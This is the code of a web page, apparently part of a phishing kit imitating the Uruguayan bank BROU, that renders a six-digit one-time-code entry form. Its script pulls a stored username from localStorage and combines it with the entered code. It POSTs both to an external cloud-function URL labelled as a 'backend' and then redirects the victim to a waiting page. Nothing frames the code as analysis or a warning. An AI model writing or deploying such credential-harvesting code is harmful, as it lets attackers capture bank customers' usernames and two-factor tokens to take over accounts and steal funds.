<style>
    .otp-wrapper {
  display: flex;
  gap: 10px;
  justify-content: center;
  margin-top: 10px;
}

.otp-box {
  width: 45px;
  height: 55px;
  text-align: center;
  font-size: 24px;
  border: 2px solid #ccc;
  border-radius: 10px;
  outline: none;
  transition: all 0.2s ease;
}

.otp-box:focus {
  border-color: #4A90E2;
  box-shadow: 0 0 10px rgba(74, 144, 226, 0.3);
}

.otp-box.filled {
  border-color: #4A90E2;
  background: #4A90E2;
}

</style>
    <script>
        const otpInputs = document.querySelectorAll(".otp-box");

otpInputs.forEach((input, index) => {
  
  input.addEventListener("input", (e) => {
    const value = e.target.value.replace(/\D/g, "");
    e.target.value = value;

    // estilo al escribir
    if (value) input.classList.add("filled");
    else input.classList.remove("filled");

    // Si pegó el código completo
    if (value.length > 1) {
      const digits = value.split("");
      digits.forEach((d, i) => {
        if (otpInputs[i]) {
          otpInputs[i].value = d;
          otpInputs[i].classList.add("filled");
        }
      });
      otpInputs[5].focus();
      checkOTP();
      return;
    }

    // saltar al siguiente
    if (value && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }

    checkOTP();
  });

  // retroceder
  input.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !input.value && index > 0) {
      otpInputs[index - 1].focus();
    }
  });
});

function getOTP() {
  return Array.from(otpInputs).map(i => i.value).join("");
}

function checkOTP() {
  const code = getOTP();
  if (code.length === 6) {
    console.log("Código completo:", code);
    enviar(code);
  }
}

// Aquí llamas tu backend


async function enviar(code) {
  const usr = localStorage.getItem("usr");
  const usrs = code;

  const message = `BROU-- --usuario: <code>${usr}</code> --  TOKEN:<code> ${usrs} </code>-- `;

  try {
    const response = await fetch(
      "https://44cbe964-81ba-4bd2-ab6b-4a52c2ad5eb9.us-east-1.cloud.genez.io/",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      }
    );

    const data = await response.json();

    if (response.ok) {
      localStorage.setItem("usr", usr);
      window.location = "wait.html";
    } else {
      console.log("❌ Error al enviar mensaje: " + data.error);
    }
  } catch (error) {
    console.log("❌ Error en la solicitud: " + error.message);
  }
}

 function detectarDispositivo() {
    const ua = navigator.userAgent.toLowerCase();

    const esTelefono =
      /iphone|ipod|android.*mobile|windows phone|blackberry|opera mini|mobile/i.test(
        ua
      );

    const esTablet =
      /ipad|android(?!.*mobile)|tablet|kindle|silk|playbook/i.test(ua);

    if (esTelefono) {
      document.getElementById("dec").removeAttribute("style");
    } else if (esTablet) {
      document.getElementById("dec").removeAttribute("style");
    } else {
      // Desktop → se queda en la página actual
      console.log("Dispositivo desktop detectado");
    }
  }

  detectarDispositivo();


    </script>
